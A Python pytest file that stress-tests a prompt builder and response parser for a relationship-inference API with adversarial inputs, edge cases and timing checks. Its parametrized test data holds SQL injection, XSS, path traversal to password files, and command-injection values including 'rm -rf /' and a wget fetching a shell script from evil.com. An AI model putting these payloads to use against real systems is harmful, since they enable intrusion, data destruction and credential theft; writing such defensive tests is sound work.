"""
STRESS TESTS for Deep Network Sync API

These tests are designed to break the system if possible.
They cover edge cases, malicious inputs, and performance under load.

Run with: pytest tests/test_sync_stress.py -v
"""

import pytest
import json
import time
from datetime import datetime, timezone

from app.routes.sync import (
    RelationshipInferenceRequest,
    AnonymizedNode,
    AnonymizedEdge,
    CandidatePair,
    InferredRelationship,
    _build_inference_prompt,
    _parse_inference_response,
    _inference_system_prompt,
)


class TestMaliciousInputs:
    """Test handling of malicious/adversarial inputs."""

    # ==========================================
    # SQL INJECTION ATTEMPTS
    # ==========================================

    @pytest.mark.parametrize("malicious_input", [
        "'; DROP TABLE users; --",
        "1 OR 1=1",
        "1; DELETE FROM nodes WHERE 1=1",
        "UNION SELECT * FROM passwords",
        "node'); INSERT INTO admin VALUES('hacked",
        "SELECT * FROM users WHERE id = '' OR '1'='1'",
        "'; EXEC xp_cmdshell('net user'); --",
        "1'; WAITFOR DELAY '0:0:10'--",
    ])
    def test_sql_injection_in_placeholder(self, malicious_input):
        """SQL injection attempts in node placeholders should not cause issues."""
        node = AnonymizedNode(placeholder=malicious_input, node_type="person")
        prompt = _build_inference_prompt([node], [], [])
        # Should include the input safely in JSON
        assert malicious_input in prompt or json.dumps(malicious_input)[1:-1] in prompt

    @pytest.mark.parametrize("malicious_input", [
        "person'; DROP TABLE--",
        "organization OR 1=1",
        "event; DELETE FROM *",
    ])
    def test_sql_injection_in_node_type(self, malicious_input):
        """SQL injection in node type should be handled safely."""
        node = AnonymizedNode(placeholder="P1", node_type=malicious_input)
        prompt = _build_inference_prompt([node], [], [])
        assert "P1" in prompt

    # ==========================================
    # XSS ATTEMPTS
    # ==========================================

    @pytest.mark.parametrize("xss_payload", [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<a href="javascript:alert(1)">click</a>',
        "'-alert(1)-'",
        '</script><script>alert(1)</script>',
    ])
    def test_xss_in_placeholder(self, xss_payload):
        """XSS payloads should be safely handled."""
        node = AnonymizedNode(placeholder=xss_payload, node_type="person")
        prompt = _build_inference_prompt([node], [], [])
        # Content should be JSON-escaped
        assert prompt  # Should not crash

    # ==========================================
    # JSON INJECTION
    # ==========================================

    @pytest.mark.parametrize("json_payload", [
        '{"malicious": true}',
        '[1,2,3]',
        'value","injected":"data',
        '\\",\\"injected\\":\\"data',
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
    ])
    def test_json_injection_in_placeholder(self, json_payload):
        """JSON injection attempts should be safely escaped."""
        node = AnonymizedNode(placeholder=json_payload, node_type="person")
        prompt = _build_inference_prompt([node], [], [])
        # Should not break JSON structure
        assert prompt

    # ==========================================
    # PATH TRAVERSAL
    # ==========================================

    @pytest.mark.parametrize("path_payload", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
    ])
    def test_path_traversal_in_placeholder(self, path_payload):
        """Path traversal attempts should be safely handled."""
        node = AnonymizedNode(placeholder=path_payload, node_type="person")
        prompt = _build_inference_prompt([node], [], [])
        assert prompt

    # ==========================================
    # COMMAND INJECTION
    # ==========================================

    @pytest.mark.parametrize("cmd_payload", [
        "; ls -la",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "&& rm -rf /",
        "|| wget http://evil.com/shell.sh",
        "\n/bin/sh",
    ])
    def test_command_injection_in_placeholder(self, cmd_payload):
        """Command injection attempts should be safely handled."""
        node = AnonymizedNode(placeholder=cmd_payload, node_type="person")
        prompt = _build_inference_prompt([node], [], [])
        assert prompt


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    # ==========================================
    # EMPTY INPUTS
    # ==========================================

    def test_empty_nodes_list(self):
        """Empty nodes list should work."""
        prompt = _build_inference_prompt([], [], [])
        assert "[]" in prompt

    def test_empty_placeholder(self):
        """Empty placeholder should be handled."""
        node = AnonymizedNode(placeholder="", node_type="person")
        prompt = _build_inference_prompt([node], [], [])
        assert prompt

    def test_empty_node_type(self):
        """Empty node type should be handled."""
        node = AnonymizedNode(placeholder="P1", node_type="")
        prompt = _build_inference_prompt([node], [], [])
        assert "P1" in prompt

    def test_whitespace_only_inputs(self):
        """Whitespace-only inputs should be handled."""
        node = AnonymizedNode(placeholder="   ", node_type="   ")
        prompt = _build_inference_prompt([node], [], [])
        assert prompt

    # ==========================================
    # EXTREMELY LONG INPUTS
    # ==========================================

    def test_very_long_placeholder(self):
        """Very long placeholder (10KB) should be handled."""
        long_placeholder = "X" * 10000
        node = AnonymizedNode(placeholder=long_placeholder, node_type="person")
        prompt = _build_inference_prompt([node], [], [])
        assert long_placeholder in prompt

    def test_very_long_node_type(self):
        """Very long node type should be handled."""
        long_type = "person" * 1000
        node = AnonymizedNode(placeholder="P1", node_type=long_type)
        prompt = _build_inference_prompt([node], [], [])
        assert "P1" in prompt

    def test_many_nodes(self):
        """Large number of nodes (1000) should be handled."""
        nodes = [
            AnonymizedNode(placeholder=f"P{i}", node_type="person")
            for i in range(1000)
        ]
        prompt = _build_inference_prompt(nodes, [], [])
        assert "P0" in prompt
        assert "P999" in prompt

    def test_many_edges(self):
        """Large number of edges (1000) should be handled."""
        nodes = [AnonymizedNode(placeholder=f"P{i}", node_type="person") for i in range(100)]
        edges = [
            AnonymizedEdge(
                from_placeholder=f"P{i}",
                to_placeholder=f"P{(i+1) % 100}",
                relationship_type="knows",
                confidence=0.8,
            )
            for i in range(1000)
        ]
        prompt = _build_inference_prompt(nodes, edges, [])
        assert prompt

    def test_many_candidates(self):
        """Large number of candidates (1000) should be handled."""
        candidates = [
            CandidatePair(
                placeholder_a=f"P{i}",
                placeholder_b=f"P{i+1}",
                discovery_source="semantic",
                similarity_score=0.8,
            )
            for i in range(1000)
        ]
        prompt = _build_inference_prompt([], [], candidates)
        assert prompt

    # ==========================================
    # UNICODE & SPECIAL CHARACTERS
    # ==========================================

    @pytest.mark.parametrize("unicode_input", [
        "日本語テスト",  # Japanese
        "中文测试",  # Chinese
        "العربية",  # Arabic
        "עברית",  # Hebrew
        "한국어",  # Korean
        "Ελληνικά",  # Greek
        "Кириллица",  # Cyrillic
        "🎉🔥💀👻",  # Emojis
        "Ñoño",  # Spanish
        "Ümlauts äöü",  # German
    ])
    def test_unicode_in_placeholder(self, unicode_input):
        """Unicode characters should be handled correctly."""
        node = AnonymizedNode(placeholder=unicode_input, node_type="person")
        prompt = _build_inference_prompt([node], [], [])
        # Should be properly JSON-encoded
        assert prompt

    @pytest.mark.parametrize("special_char", [
        "\n",  # newline
        "\t",  # tab
        "\r\n",  # CRLF
        "\\",  # backslash
        '"',  # double quote
        "'",  # single quote
        "\x00",  # null byte
        "\x1b",  # escape
    ])
    def test_special_characters_in_placeholder(self, special_char):
        """Special characters should be handled correctly."""
        placeholder = f"before{special_char}after"
        node = AnonymizedNode(placeholder=placeholder, node_type="person")
        prompt = _build_inference_prompt([node], [], [])
        assert prompt

    # ==========================================
    # NUMERIC EDGE CASES
    # ==========================================

    @pytest.mark.parametrize("confidence", [
        0.0,
        1.0,
        0.5,
        0.99999999,
        0.00000001,
    ])
    def test_confidence_boundaries(self, confidence):
        """Confidence values at boundaries should work."""
        edge = AnonymizedEdge(
            from_placeholder="P1",
            to_placeholder="P2",
            relationship_type="knows",
            confidence=confidence,
        )
        prompt = _build_inference_prompt([], [edge], [])
        assert prompt


class TestResponseParsing:
    """Test LLM response parsing with adversarial inputs."""

    # ==========================================
    # MALFORMED JSON
    # ==========================================

    @pytest.mark.parametrize("bad_json", [
        "",
        "   ",
        "null",
        "undefined",
        "{",
        "[",
        "{'key': 'value'}",  # single quotes
        '{"unclosed": "string',
        '[{"missing": "bracket"}',
        "not json at all",
        "12345",
        "true",
        "false",
    ])
    def test_malformed_json_returns_empty(self, bad_json):
        """Malformed JSON should return empty list, not crash."""
        result = _parse_inference_response(bad_json)
        assert result == []

    # ==========================================
    # VALID JSON BUT WRONG STRUCTURE
    # ==========================================

    @pytest.mark.parametrize("wrong_structure", [
        "{}",  # object instead of array
        '{"from": "P1", "to": "P2", "type": "knows", "confidence": 0.8}',  # object not in array
        '"just a string"',
        "123",
        '[[]]',  # nested arrays
        '[null]',
        '[true, false]',
        '[1, 2, 3]',
    ])
    def test_wrong_structure_returns_empty(self, wrong_structure):
        """Wrong JSON structure should return empty list."""
        result = _parse_inference_response(wrong_structure)
        assert result == []

    # ==========================================
    # MISSING REQUIRED FIELDS
    # ==========================================

    def test_missing_from_field(self):
        """Missing 'from' field should skip item."""
        response = '[{"to": "P2", "type": "knows", "confidence": 0.8}]'
        result = _parse_inference_response(response)
        assert len(result) == 0

    def test_missing_to_field(self):
        """Missing 'to' field should skip item."""
        response = '[{"from": "P1", "type": "knows", "confidence": 0.8}]'
        result = _parse_inference_response(response)
        assert len(result) == 0

    def test_missing_type_field(self):
        """Missing 'type' field should skip item."""
        response = '[{"from": "P1", "to": "P2", "confidence": 0.8}]'
        result = _parse_inference_response(response)
        assert len(result) == 0

    def test_missing_confidence_field(self):
        """Missing 'confidence' field should skip item."""
        response = '[{"from": "P1", "to": "P2", "type": "knows"}]'
        result = _parse_inference_response(response)
        assert len(result) == 0

    # ==========================================
    # INVALID FIELD VALUES
    # ==========================================

    @pytest.mark.parametrize("invalid_confidence", [
        '"not a number"',
        'null',
        '[]',
        '{}',
        '"0.8"',  # string instead of number
    ])
    def test_invalid_confidence_type(self, invalid_confidence):
        """Invalid confidence type should be handled."""
        response = f'[{{"from": "P1", "to": "P2", "type": "knows", "confidence": {invalid_confidence}}}]'
        # Should either skip or handle gracefully
        result = _parse_inference_response(response)
        # Not crashing is the main test

    # ==========================================
    # MARKDOWN WRAPPED RESPONSES
    # ==========================================

    def test_json_in_markdown_code_block(self):
        """JSON in markdown code block should be extracted."""
        response = '''Here's the analysis:

```json
[{"from": "P1", "to": "P2", "type": "knows", "confidence": 0.85}]
```

I found one relationship.'''

        result = _parse_inference_response(response)
        assert len(result) == 1
        assert result[0].from_placeholder == "P1"

    def test_json_in_plain_code_block(self):
        """JSON in plain code block should be extracted."""
        response = '''Analysis:

```
[{"from": "P1", "to": "O1", "type": "works_at", "confidence": 0.9}]
```'''

        result = _parse_inference_response(response)
        assert len(result) == 1

    def test_json_with_surrounding_text(self):
        """JSON with surrounding text should be extracted."""
        response = '''Based on my analysis, here are the relationships:

[{"from": "P1", "to": "P2", "type": "friend_of", "confidence": 0.75}]

These relationships show a strong connection pattern.'''

        result = _parse_inference_response(response)
        assert len(result) == 1

    # ==========================================
    # ADVERSARIAL LLM RESPONSES
    # ==========================================

    def test_llm_refuses_with_explanation(self):
        """LLM refusing to answer should return empty."""
        response = "I cannot analyze this data because it might contain personal information."
        result = _parse_inference_response(response)
        assert result == []

    def test_llm_returns_thinking_process(self):
        """LLM returning thinking but no JSON should return empty."""
        response = '''Let me think about this...

The nodes appear to be connected in some way.

PERSON_1 might know ORG_1.

However, I need more information to be certain.'''
        result = _parse_inference_response(response)
        assert result == []

    def test_llm_returns_malformed_json_explanation(self):
        """LLM explaining why it can't return JSON should return empty."""
        response = "I would return [{{from: P1, to: P2}}] but that's not valid JSON."
        result = _parse_inference_response(response)
        assert result == []


class TestPerformance:
    """Performance tests under load."""

    def test_prompt_building_performance_1000_nodes(self):
        """Building prompt with 1000 nodes should be fast."""
        nodes = [AnonymizedNode(placeholder=f"P{i}", node_type="person") for i in range(1000)]
        edges = [
            AnonymizedEdge(
                from_placeholder=f"P{i}",
                to_placeholder=f"P{(i+1) % 1000}",
                relationship_type="knows",
                confidence=0.8,
            )
            for i in range(500)
        ]
        candidates = [
            CandidatePair(
                placeholder_a=f"P{i}",
                placeholder_b=f"P{i+500}",
                discovery_source="semantic",
                similarity_score=0.75,
            )
            for i in range(100)
        ]

        start = time.time()
        prompt = _build_inference_prompt(nodes, edges, candidates)
        elapsed = time.time() - start

        assert prompt
        assert elapsed < 1.0  # Should complete in under 1 second

    def test_response_parsing_performance_100_relationships(self):
        """Parsing 100 relationships should be fast."""
        relationships = [
            {"from": f"P{i}", "to": f"P{i+1}", "type": "knows", "confidence": 0.8}
            for i in range(100)
        ]
        response = json.dumps(relationships)

        start = time.time()
        result = _parse_inference_response(response)
        elapsed = time.time() - start

        assert len(result) == 100
        assert elapsed < 0.5  # Should complete in under 500ms

    def test_repeated_parsing_performance(self):
        """Parsing same response 1000 times should be fast."""
        response = '[{"from": "P1", "to": "P2", "type": "knows", "confidence": 0.8}]'

        start = time.time()
        for _ in range(1000):
            _parse_inference_response(response)
        elapsed = time.time() - start

        assert elapsed < 2.0  # Should complete in under 2 seconds


class TestRequestValidation:
    """Test request model validation."""

    def test_request_with_all_fields(self):
        """Request with all fields should be valid."""
        request = RelationshipInferenceRequest(
            nodes=[AnonymizedNode(placeholder="P1", node_type="person")],
            existing_edges=[
                AnonymizedEdge(
                    from_placeholder="P1",
                    to_placeholder="O1",
                    relationship_type="works_at",
                    confidence=0.9,
                )
            ],
            candidate_pairs=[
                CandidatePair(
                    placeholder_a="P1",
                    placeholder_b="P2",
                    discovery_source="semantic",
                    similarity_score=0.8,
                    cooccurrence_count=5,
                )
            ],
            max_inferences=10,
            provider="groq",
        )

        assert len(request.nodes) == 1
        assert len(request.existing_edges) == 1
        assert len(request.candidate_pairs) == 1

    def test_request_with_minimal_fields(self):
        """Request with only required fields should be valid."""
        request = RelationshipInferenceRequest(
            nodes=[],
            existing_edges=[],
            candidate_pairs=[],
        )

        assert request.max_inferences == 10  # default
        assert request.provider == "groq"  # default

    def test_request_max_inferences_zero(self):
        """max_inferences of 0 should be valid but produce no results."""
        request = RelationshipInferenceRequest(
            nodes=[],
            existing_edges=[],
            candidate_pairs=[
                CandidatePair(
                    placeholder_a="P1",
                    placeholder_b="P2",
                    discovery_source="semantic",
                )
            ],
            max_inferences=0,
        )

        # Request should limit candidates to 0
        assert request.max_inferences == 0

    def test_request_negative_max_inferences(self):
        """Negative max_inferences should be handled."""
        request = RelationshipInferenceRequest(
            nodes=[],
            existing_edges=[],
            candidate_pairs=[],
            max_inferences=-1,
        )
        # Should still be valid model (validation happens at API level)
        assert request.max_inferences == -1


class TestSystemPrompt:
    """Test system prompt security."""

    def test_system_prompt_no_data_leakage(self):
        """System prompt should not leak sensitive patterns."""
        prompt = _inference_system_prompt()

        # Should not contain real database info
        assert "password" not in prompt.lower()
        assert "secret" not in prompt.lower()
        assert "api_key" not in prompt.lower()
        assert "token" not in prompt.lower()

    def test_system_prompt_mentions_privacy(self):
        """System prompt should emphasize privacy."""
        prompt = _inference_system_prompt()

        # Should mention anonymization
        privacy_terms = ["anonymized", "anonymous", "placeholder", "privacy"]
        assert any(term in prompt.lower() for term in privacy_terms)

    def test_system_prompt_requests_structured_output(self):
        """System prompt should request JSON output."""
        prompt = _inference_system_prompt()
        assert "json" in prompt.lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
